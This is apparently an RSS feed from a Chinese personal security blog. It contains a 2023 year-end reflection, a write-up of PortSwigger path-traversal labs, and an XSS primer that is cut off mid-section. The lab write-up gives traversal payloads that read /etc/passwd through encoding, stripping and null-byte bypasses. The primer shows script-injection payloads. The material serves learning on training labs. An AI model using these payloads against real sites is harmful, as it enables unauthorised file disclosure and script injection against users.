<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>OhMyDarkSpace</title>
    <link>https://by-musi.github.io/</link>
    
    <image>
      <url>https://by-musi.github.io/icon.png</url>
      <title>OhMyDarkSpace</title>
      <link>https://by-musi.github.io/</link>
    </image>
    
    <atom:link href="https://by-musi.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>一个无聊的人，写点无聊的文</description>
    <pubDate>Sun, 11 Feb 2024 02:37:25 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>2023 年终总结</title>
      <link>https://by-musi.github.io/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
      <guid>https://by-musi.github.io/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
      <pubDate>Sat, 10 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<p>今天是大年初二，稍微更两篇文章吧。钢铁直男，文笔一般，大家将就着看哈。</p><p>我的 2023 是一部属于自己的冰与火之歌，也算是精彩纷呈。前半年，西安，本科僧，快乐划水，无忧无虑；后半年，北京，研究牲，打工人，always emo。 </p><p>这一年，我完成了毕业设计，离开了西安交大，来到北京邮电大学。这一年，我跟好哥们一起玩了好多好多游戏，一起去了惠州、广州、张家口，真是一场难忘的毕业旅行。这一年，我第一次坐飞机，第一次去南方城市，第一次见识到都市的繁华，也尝到了被大太阳撵着烤的滋味，肤色也深沉了几个度，还是北方的风适合不羁的我，（没说你嗷，北京）。这一年，我第一次来到北京，第一次离天安门这么近，认识了很多新的伙伴，也第一次进行了一个讪的搭。</p><p>那是我人生中第一次搭讪。搭讪之前，我以为我会认识一位女孩子，可结果却是认识了我自己。原来我这么不会聊天的嘛，原来我这么钢铁直男的嘛！（详情参见下方 尴尬语录）仔细一想，我好像是有这么一个弱点：心情好的时候，嘴巴就会止不住地哔哔叨。在我这里，多巴胺的任务好像不单单是愉悦心情，还会顺带攻击语言中枢，可我那点情商根本应对不了满嘴胡放炮的严峻形势，结果就是犯了聊天的大忌，常常在不经意间伤到别人。之后，我意识到毕业旅行的时候好像也因为这个说错了几次话，就在群里给哥几个道了个歉。那会可真是给我 emo 坏了，时不时琢磨一下最近说的话，哪些说错了，应该怎么说，甚至会不自觉带入当时的情景，然后用比较 “恰当” 方式进行处理。这玩意是不是叫 “精神分裂”？哈哈。</p><p>不过现在已经没事了，我开摆了。不得不说，躺平和开摆这哥俩在某些情况下还真是有一手，不会聊就不聊了呗。工作、健身、学习、挖洞，时间根本不够用，我恨不得把一天掰成两天过，社交就先靠边稍息一下。可我的倾诉欲还是有那么亿丢丢强的，咋办嘞？我不断寻找答案，直至无意间看到了这么一句话：写作就是自己与自己对话。我愿称之为年度最佳！自己跟自己聊天可不需要在意我是不是在玩烂梗，也不用管处理方式是否恰当，写的人是我，看的人大概率也是我，自己开心就完事了。转念一想，文章写都写了，为什么不发出来呢，如若能帮助到大家，我倍感荣幸。我是从互联网上学到的知识，理应无条件回馈给互联网。所以，我搭建了自己的博客，在网络世界也有了自己的一亩三分地。</p><p>现在搭博客可真是方便，也不用自己买服务器，github 建个库，自己再随便折腾一下，一个博客就诞生了。我的搭建方案是 hexo + cacuts 主题。一提到 cactus 我就一肚子委屈，好好的 next 主题不用，非得用 cactus，我真傻，真的（虽说这个主题在我审美上吧）。cactus 的作者奉行极简，所以这款主题啥也没有，有很多我不喜欢的小瑕疵。为了搭这个博客，我真是快把 cactus 的源码都看个底儿朝天了，从下图展示的部分 todo 就可见一斑。搭这个博客可是费了我老鼻子劲儿了，好像研究了整整两周，具体多久记不住了，只依稀记得那两天每天下班健完身就搞这破玩意。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/11/Pasted_image_20240210205204.png" data-caption=""><img src="/images/2024/02/11/Pasted_image_20240210205204.png"></a></p><p>欧克，博客搭建完了，现在就差文章了。我习惯使用 Obsidian 记录与写作，并且已经在库中写了很多东西了，可博客用的却是 hexo，二者虽然都记录在 markdown 文件中，但具体语法还是稍有不同。我还有个毛病就是忍受不了繁琐简单的工作。让我啥也不干就搁这改语法，我是一百个不愿意啊，而脚本恰恰可以完美解决这个问题 – 让繁琐的工作自动化。于是我又开始着手编写脚本。2023，我真是<strong>把“本末倒置”演绎到极致</strong>了，之前搭建博客是干啥来着？有 ChatGPT 的帮助，写个百十来行的小脚本并不是什么难事，但由于我没有理顺脚本的架构，写完的脚本目前只能修改语法、发布文章，还不能更新博客。我不是一个固执的人，但并不否认我确实有点完美主义。其实我已经写完很多文章了，但感觉还没到能发的程度，就一直被我捂着，发了之后，我可能就懒得改了，况且这破脚本还不允许我更新博客。以后工作项目组要是采用 “小步快跑，快速迭代” 的策略，我岂不是要难受死？</p><p>后面就一直跟着 PortSwigger 的教程学习 web 安全，已经做完七十来个 lab 啦，具体就不多说了。有意思的是，“newbie” 的中文意思是 “新手”，却跟 “牛逼” 同音，而从 “newbie” 到 “牛逼”，我还有很长的路要走。加油，菜同学！我要做自己的码头。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/11/Pasted_image_20240211083859.png" data-caption=""><img src="/images/2024/02/11/Pasted_image_20240211083859.png"></a></p><p><strong>我啥时候能挖到一个洞啊！！！</strong></p><p>聊点别的吧。来北京之前，我曾无数次幻想过北京的样子，但我是万万没想到会有这么个情况：中午时分，窗外大雪纷飞，我穿着老汉背心在工位上爬了一会，出了一身汗。这几个名词以一种很新的方式关联到一起，给我整不会了。北京室内室外温差咋这大呢，空调暖风 27 度，还没法调温度，让不让人好好工作啦！！写两行 Hello World 脑子就迷糊了。</p><p>我来了北京才知道，风是真的能用“呼啸”来形容！！西安就很少有这么大的风。这里说明一下，我并不是西安人，只是在西安求学，不过老家离西安也蛮近的，小时候，奶奶看天气预报就看西安的，哈哈，我这人跑步不行，跑题可是杠杠的。在北京骑车过十字路口，差点给我撂倒。北京大半夜不睡觉搁那呼呼吹口哨，把我都整失眠了。难道北京城也是个渣男？</p><p>好了，就酱紫吧，不能再聊了，聊出感情就坏了。</p><p>下面我细数了一下 2023 做的事，原来我还是干了点人事的呀，哈哈，大家挑着看就好了。</p><p>最后，新年快乐！！！！！！！！！！！！！！</p><h1 id="2023-就干了点这？"><a href="#2023-就干了点这？" class="headerlink" title="2023 就干了点这？"></a>2023 就干了点这？</h1><ol><li>搭建个人博客，<a href="https://by-musi.github.io/">https://by-musi.github.io/</a> 并进行了一些外观上的优化，还没整完，有点懒得搞了，太麻烦了，呜呜。发了三篇博客</li><li>CSDN 同步发一些文章，目前发了四篇，48个粉丝 ，其实就图一乐，顺便给个人博客引点流量。</li><li>读了一些论文。我现在其实并没有读论文的需求，大多时间都在学 web 或配合公司做反诈方面的工作，所以就看了这几篇，<strong>之后整理整理发博客？</strong> 后面 fuzz 的论文是做毕设的时候看的，很多都忘了<ol><li>Label-free Poisoning Attack against Deep Unsupervised Domain Adaptation</li><li>ZMap: Fast Internet-Wide Scanning and its Security Applications 没太看懂</li><li>prompt injection attack LLM-integrated Applications 提示词注入框架 – 后羿</li><li>The Art Science and Engineering of Fuzzing</li><li>CarpetFuzz: Automatic Program Option Constraint Extraction from Documentation for Fuzzing</li><li>Skyfire: Data-Driven Seed Generation for Fuzzing</li><li>IOTFUZZER : Discovering Memory Corruptions in IoT Through App-based Fuzzing</li><li>Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference</li><li>HowtoReadaPaper 就四页，其实不算一个 paper</li></ol></li><li>完成毕业设计，优化 Snipuzz，研究了源码，优化得依托答辩，哈哈，不过还是掌握了 fuzz 的基本套路</li><li>读书，这学期意识到了<strong>软实力</strong>的重要性，不能一味研究技术，跟人说话都说不来了<del>，主要是为了搭讪</del>。<ol><li>《线上幽灵：克里·米特尼克自传》，大佬，无敌</li><li>《图解密码技术》看完没总结，忘完了</li><li>《魔鬼搭讪学》，就。。。图一乐？</li><li>《杀死一只知更鸟》</li><li>《the art of ChatGPT Prompting: A Guide to Crafting Clear and Effective Prompts》 写的依托答辩，三十来页 pdf，算一个小册子</li><li>《Bug Bounty Playbook》。这本看了信息收集部分，<strong>神中神</strong>，看完马上就有了信息收集的思路，之前一味调研工具确实有点浪费时间</li></ol></li><li>ChatGPT &amp; prompt engineering <ol><li>今年 ChatGPT 一炮炸响，但我直到十一月才用上 GPT4，前面用过一些其他的GPT，不过都不尽如人意，如 Bing 等各种乱七八糟的网站</li><li>看了吴恩达的 prompt engineering 课程：deeplearning.ai ChatGPT Prompt Engineering for Developers，<strong>还没总结</strong>，懒癌快晚期了。</li><li>自主在 github 上搜了很多 GPT 以及 prompt 方面的内容，还没消化完</li></ol></li><li>开始注重每天摄入信息的质量，知乎、小红书纯纯浪费时间<ol><li>使用 Feedly 订阅了很多博客，大部分都是英文，不过质量很高</li><li>形成并优化自己的信息流和学习流程<ol><li>信息摄取：feedly, x (twitter), youtube </li><li>信息收藏：cubox，notion 操作起来真是太复杂了，现在我用 notion 记录一些渗透的 checklist 和中间结果</li><li>记录+总结：obsidian 使用坚果云和百度网盘同步空间同步</li><li>pdf资料（书&#x2F;论文）：ipad marginnote3 <strong>ps:</strong> 自从买了平板之后看书时间明显变长了，都给我卷起来！</li></ol></li></ol></li><li>PortSwigger web academy。虽然这些都是基础，实战基本用不到，汶飞师哥也说有个印象就行，我还是打算抽点时间把这些基础 lab 都做一下，更多的是掌握思想，而且很多时候说和做是两码事 emmmm<ol><li>把这两百多个 lab 做完，然后照着师哥说的思路学习，目前进度：72&#x2F;264</li><li><strong>争取下学期开学前搞完</strong></li></ol></li><li>重新开始折腾 archlinux<ol><li>原因：懒得在各种设备上配环境，魔霸7p又太重了，只好拿出已经退役小半年的骚粉小新14了。老年轻薄本只能跑跑 linux了。</li><li>一直寻思着给自己整一个渗透测试工具箱，直到看到了 blackarch </li><li>当然，还有很多东西等待我去折腾。</li></ol></li><li>开始自己编写脚本。不得不说 ChatGPT 真是写脚本的好帮手，我也能为开源做点贡献啦。<ol><li>ob2hexo：将 obsidian 仓库中的文章一键发布到 hexo，现在还是半成品，只能进行基础的发布操作，现在有很多改进思路了</li></ol></li><li>健身也没有落下哦，跟着胤哥练了两周，学习了很多，胤哥的训练容量是真的大，之后由于时间关系没法跟胤哥一块练了，但我还在照着胤哥的计划练，这学期体重减了 2 kg 左右，胸围还增了 4 cm（101 了），进步还是有的。更新：隔了一个月又量了一下，98，裂开，估计是上次量的时候动作摆得太开了….</li></ol><h1 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h1><ol><li>今年最大的成长就是<strong>面对英文资料不再害怕</strong>了，这之后就发现中文资料的质量其实远远比不上英文的 emmm <ol><li>现在遇到什么问题，大多时候都是直接搜英文资料。</li><li>跟 ChatGPT 聊天我也都用英文，就是不知道这样能不能稍稍提高一下 回答的质量。</li><li>甚至开始读英文书了</li></ol></li><li>另一个成长就是知道了 github 的牛逼之处，现在有事没事就去浏览一下 github，也确实发现了很多有意思有用的项目。</li><li>开始浏览国内外大佬的挖洞姿势，开始看 hackerone activity 的漏洞报告以及订阅的其他博客的挖洞经验分享，但我现在基础有点差，很多博客即使看了很长时间也看不懂 emmm</li><li><del>md，</del>（我不会再说脏话了）有太多想干的事啦，多发五分钟的呆都是罪恶</li></ol><h1 id="直男尴尬语录"><a href="#直男尴尬语录" class="headerlink" title="直男尴尬语录"></a>直男尴尬语录</h1><p>没解释的就是满满的不堪回首的尬。</p><ol><li>有不带薪的假期嘛？<ol><li>刚开学的时候老师给我们开了个会，据他的描述，这个会的意义是：把丑话说到前头，明确注意事项。当时好像有一条是学生暑假享有一周的带薪假期，这条给我整懵了，研究生暑假只能休息一周，还是说其实还有不带薪的假期？然后举手示意，问了老师这句话，现在想想多少有点不尊重老师，呜呜。</li></ol></li><li>沙河下的人不多。</li><li>我喜欢吃陈醋。</li><li>中裤？中分裤！</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/%E7%A2%8E%E7%AC%94%E7%9A%84%E9%9A%8F/">碎笔的随</category>
      
      
      <comments>https://by-musi.github.io/2024/02/11/2023_%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PortSwigger path-traversal labs</title>
      <link>https://by-musi.github.io/2023/12/26/PortSwigger_path-traversal_labs/</link>
      <guid>https://by-musi.github.io/2023/12/26/PortSwigger_path-traversal_labs/</guid>
      <pubDate>Mon, 25 Dec 2023 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-Lab-File-path-traversal-simple-case"><a href="#1-Lab-File-path-traversal-simple-case" class="headerlink" title="1 Lab: File path traversal, simple case"></a>1 Lab: File path traversal, simple case</h1><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206223726.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206223726.png"></a></p><p>网页使用 GET 请求获取图片。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/image?filename=5.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>linux 系统网站的 base directory 是 <code>/var/www/images</code>，使用目录穿越，构造 payload <code>../../../etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206224857.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206224857.png"></a></p><p>Lab 解决，由于 <code>&lt;img&gt;</code> 标签限制，无法展示出 <code>/etc/passwd</code> 文件的内容。</p><p>为了方便展示，使用 burp 抓包，发送到 Repeater，修改 filename。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206224112.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206224112.png"></a></p><p>得到的响应报文如下：</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><p>可以看到已经拿到了 <code>/etc/passwd</code> 的内容。</p><h1 id="2-Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><a href="#2-Lab-File-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass" class="headerlink" title="2 Lab: File path traversal, traversal sequences blocked with absolute path bypass"></a>2 Lab: File path traversal, traversal sequences blocked with absolute path bypass</h1><p>同样，使用 burp 抓包，正常的图片请求如下：</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206225530.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206225530.png"></a></p><p>构造 filename：<code>../../../etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206225841.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206225841.png"></a></p><p>可能是网站对 filename 进行了过滤。</p><p>使用<strong>绝对路径</strong>绕过。</p><p>发送 filename&#x3D;<code>/etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206230039.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206230039.png"></a></p><p>成功。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><hr><blockquote><p>[!question] 问题<br>服务端没有回显对 filename 的解析结果，如何选择合适的绕过方式？</p><p>答：只能一个一个试，或者用字典<strong>爆破</strong>吧</p></blockquote><hr><h1 id="3-Lab-File-path-traversal-traversal-sequences-stripped-non-recursively"><a href="#3-Lab-File-path-traversal-traversal-sequences-stripped-non-recursively" class="headerlink" title="3 Lab: File path traversal, traversal sequences stripped non-recursively"></a>3 Lab: File path traversal, traversal sequences stripped non-recursively</h1><p>burp 抓包，构造 filename，<code>....//..././..././etc/passwd</code> 类似于双写绕过，后端的逻辑可能是仅将 <code>../</code> 替换为 空。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231206233022.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231206233022.png"></a></p><p>拿到 <code>/etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><h1 id="4-Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode"><a href="#4-Lab-File-path-traversal-traversal-sequences-stripped-with-superfluous-URL-decode" class="headerlink" title="4 Lab: File path traversal, traversal sequences stripped with superfluous URL-decode"></a>4 Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</h1><p>抓包，burp 重放，构造 <code>filename=../../../etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207221030.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207221030.png"></a></p><p>响应也不出意外的是 “No such file”。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207221118.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207221118.png"></a></p><p>使用<strong>双重 URL 编码</strong>绕过，构造 payload : <code>filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd</code></p><p>推荐一个编码工具，<a href="https://gchq.github.io/CyberChef/">CyberChef</a></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208092614.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208092614.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222326.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222326.png"></a></p><p>成功访问 <code>/etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><h1 id="5-Lab-File-path-traversal-validation-of-start-of-path"><a href="#5-Lab-File-path-traversal-validation-of-start-of-path" class="headerlink" title="5 Lab: File path traversal, validation of start of path"></a>5 Lab: File path traversal, validation of start of path</h1><p>burp 抓包，可以看到文件以 <code>/var/www/images/</code> 开头，后端可能会判断文件的前几个目录来判断其有效性。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208085758.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208085758.png"></a></p><p>构造文件名 <code>filename=../../../etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208090410.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208090410.png"></a></p><p>得到的响应如下：</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208090427.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208090427.png"></a></p><p>构造文件名 <code>filename=/var/www/images/../../../etc/passwd</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208090119.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208090119.png"></a></p><p>成功绕过。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p><h1 id="6-Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass"><a href="#6-Lab-File-path-traversal-validation-of-file-extension-with-null-byte-bypass" class="headerlink" title="6 Lab: File path traversal, validation of file extension with null byte bypass"></a>6 Lab: File path traversal, validation of file extension with null byte bypass</h1><p>构造文件名：<code>filename=../../../etc/passwd%00.jpg</code>。因为这个 lab 是通过验证文件扩展名来验证其有效性，所以我们以 <code>.jpg</code> 结尾，但我们想要访问的文件并不含有 <code>.jpg</code>，这里使用空字节 <code>%00</code> 截断。</p><p><code>.jpg</code> 绕过验证，在解析文件名时只解析 <code>%00</code> 前的部分。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231208093928.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231208093928.png"></a></p><p>成功拿到 <code>/etc/passwd</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/26/Pasted_image_20231207222507.png" data-caption=""><img src="/images/2023/12/26/Pasted_image_20231207222507.png"></a></p>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/path-traversal/">path-traversal</category>
      
      <category domain="https://by-musi.github.io/tags/writeup/">writeup</category>
      
      
      <comments>https://by-musi.github.io/2023/12/26/PortSwigger_path-traversal_labs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>XSS基础介绍</title>
      <link>https://by-musi.github.io/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</link>
      <guid>https://by-musi.github.io/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</guid>
      <pubDate>Tue, 19 Dec 2023 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-什么是-XSS"><a href="#1-什么是-XSS" class="headerlink" title="1 什么是 XSS"></a>1 什么是 XSS</h1><p>XSS, 跨站脚本漏洞，英文全称 Cross Site Script，是一种能够让黑客通过“<strong>HTML 注入</strong>”篡改网页，向其中插入<strong>恶意脚本</strong>（一般为 JS 代码），从而在用户浏览网页时，控制用户浏览器的安全威胁，也是一种类型的注入漏洞。</p><p>在一开始，利用 XSS 进行攻击的演示案例是跨域的，所以叫做“跨站脚本”，不过现在 JavaScript 的功能日益强大、网站前端也愈发复杂，是否跨域也已不重要了。</p><h1 id="2-XSS-原理"><a href="#2-XSS-原理" class="headerlink" title="2 XSS 原理"></a>2 XSS 原理</h1><p>原理，或者说过程，如图所示。<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231127232816.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231127232816.png"></a></p><h2 id="XSS-发生的条件"><a href="#XSS-发生的条件" class="headerlink" title="XSS 发生的条件"></a>XSS 发生的条件</h2><ol><li>输入 web 应用程序的数据来自一个不可靠的源，一般是 web 请求。</li><li>包含恶意代码数据未经过滤就发送给 Web 用户。</li></ol><h1 id="3-XSS-类型"><a href="#3-XSS-类型" class="headerlink" title="3 XSS 类型"></a>3 XSS 类型</h1><h2 id="3-1-Reflected-XSS"><a href="#3-1-Reflected-XSS" class="headerlink" title="3.1 Reflected XSS"></a>3.1 Reflected XSS</h2><p>Reflected XSS 即<strong>反射型 XSS</strong>。当应用接收到HTTP请求中的数据，并把数据以一种不安全的方式，如不加任何处理，简单“反射”回浏览器（<strong>the immediate response</strong>）时，就会产生反射型 XSS 漏洞。</p><p>Reflected XSS 往往需要用户点击一个恶意链接才能攻击成功，且具有一次性，所以又叫 “<strong>非持久型</strong>” XSS。</p><p>Reflected XSS 通常出现在网站的<strong>搜索栏</strong>等地方，且恶意脚本代码通常来自于**当前的 HTTP 请求 (the current HTTP request)**。</p><h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>下面以 PortSwigger XSS labs 中的一个<a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">简单例子</a>进行说明。</p><p>该 lab 使用 GET 方法通过 search 参数传输数据，且对用户输入的数据不加任何处理就直接输出到页面上。</p><p>若用户提交如下数据，“search&#x3D;1655452184”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: web-security-academy.net/?search=1655452184</span><br></pre></td></tr></table></figure><p>得到的结果如图所示：<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231126200835.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231126200835.png"></a></p><p>查看页面源码，有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>0 search results for &#x27;1655452184&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果输入如下数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122232249.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122232249.png"></a></p><p>发现 js 脚本 <code>alert(/xss/)</code> 成功执行。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122232332.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122232332.png"></a></p><p>再次查看网页代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">&quot;0 search results for &#x27;&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&#x27;&#x27;&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-Stored-XSS"><a href="#3-2-Stored-XSS" class="headerlink" title="3.2 Stored XSS"></a>3.2 Stored XSS</h2><p>Stored XSS 即<strong>存储型</strong> XSS，常常出现在<strong>论坛、博客、留言板</strong>等位置，攻击者在发帖过程中嵌入 XSS 攻击代码，帖子被目标服务器存储在数据库中，当用户进行正常访问时，触发恶意代码。所以 Stored XSS 的恶意脚本代码通常来自于<strong>网站服务端的数据库</strong>。</p><p>也正是因为恶意代码被存储在服务端数据库中，所以 Stored XSS 不需要用户单击特定 URL 就能执行跨站脚本，且能存在更长时间，又称为“<strong>持久型 XSS</strong>”。</p><h3 id="举个栗子-1"><a href="#举个栗子-1" class="headerlink" title="举个栗子"></a>举个栗子</h3><p>下面以 PortSwigger XSS labs 中的一个 <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded">lab</a> 进行说明。</p><p>用户发布评论时，web 应用使用 POST 方法传输表单数据到服务端。</p><p>下图是发布评论时的报文：<br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128210656.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128210656.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128210637.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128210637.png"></a></p><p>服务端未对用户评论内容进行处理就存储在了数据库中，当用户访问网页时，数据库中的内容发送到客户端并展示。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233548.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233548.png"></a></p><p>在评论中嵌入恶意代码：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233735.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233735.png"></a></p><p>由于恶意代码被当作评论存储在了服务端，所以我们不论什么时候访问评论区被嵌入恶意代码的博客，均会触发 XSS (<strong>持久型 XSS</strong>)</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233822.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233822.png"></a><br><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231122233857.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231122233857.png"></a></p><h2 id="3-3-DOM-based-XSS"><a href="#3-3-DOM-based-XSS" class="headerlink" title="3.3 DOM-based XSS"></a>3.3 DOM-based XSS</h2><p>DOM-based XSS，是通过修改<strong>页面的 DOM 节点</strong>形成的 XSS。当 web 应用从攻击者可控的不受信任的来源中读取数据，并将它传入<strong>动态</strong>修改页面 <strong>DOM 节点</strong>的javascript 语句时就换产生 DOM-based XSS 漏洞。</p><p>这些 javascript 语句被称为 <strong>sink</strong>，如 <code>eval()</code>, <code>innerHTML</code>, <code>window.location</code> 等。</p><p>以下列出一些可能包含 DOM-XSS 漏洞的 sink。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span> </span><br><span class="line">element.<span class="property">innerHTML</span> </span><br><span class="line">element.<span class="property">outerHTML</span> </span><br><span class="line">element.<span class="property">insertAdjacentHTML</span> </span><br><span class="line">element.<span class="property">onevent</span></span><br></pre></td></tr></table></figure><h3 id="举个栗子-2"><a href="#举个栗子-2" class="headerlink" 